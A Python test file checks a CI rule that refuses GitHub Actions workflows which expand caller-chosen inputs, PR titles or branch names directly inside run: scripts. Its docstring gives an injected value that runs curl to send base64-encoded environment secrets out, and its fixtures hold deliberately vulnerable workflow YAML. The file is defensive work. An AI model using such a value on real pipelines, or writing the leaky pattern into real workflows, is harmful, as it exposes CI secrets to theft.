"""T-3231: caller-chosen text never becomes shell code in a workflow.

A dispatch input, an event's text or a branch name written as `${{ }}` inside a `run:` script is
substituted before the shell parses the script, so `spec='"; curl …?$(env|base64) #'` runs with
the job's secrets. `scripts/ci/check-workflow-pins.py` refuses it; these cases prove the rule bites
and that this repository's own workflows pass it.
"""

import importlib.util
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
spec = importlib.util.spec_from_file_location("pins", ROOT / "scripts/ci/check-workflow-pins.py")
pins = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pins)


def flagged(text: str) -> list[int]:
    return list(pins.chosen_in_scripts(text.splitlines()))


def test_an_input_expanded_into_a_script_is_refused():
    leaky = """jobs:
  e2e:
    steps:
      - name: pick
        run: |
          set -eu
          want="${{ inputs.spec }}"
      - run: echo ${{ github.event.pull_request.title }}
      - run: git checkout ${{ github.head_ref }}
"""
    assert flagged(leaky) == [7, 8, 9]


def test_the_same_value_through_env_and_trusted_expressions_pass():
    safe = """jobs:
  e2e:
    steps:
      - name: pick
        env:
          WANT_SPEC: ${{ inputs.spec }}
        run: |
          want="$WANT_SPEC"
          echo "${{ matrix.shard }} ${{ github.sha }} ${{ secrets.TOKEN != '' }}"
      - uses: actions/checkout@0000000000000000000000000000000000000000
        with:
          ref: ${{ inputs.ref }}
"""
    assert flagged(safe) == []


def test_this_repositorys_workflows_expand_no_chosen_text_into_a_script():
    found = [
        f"{path.name}:{number}"
        for path in sorted((ROOT / ".github/workflows").glob("*.yml"))
        for number in pins.chosen_in_scripts(path.read_text().splitlines())
    ]
    assert found == []
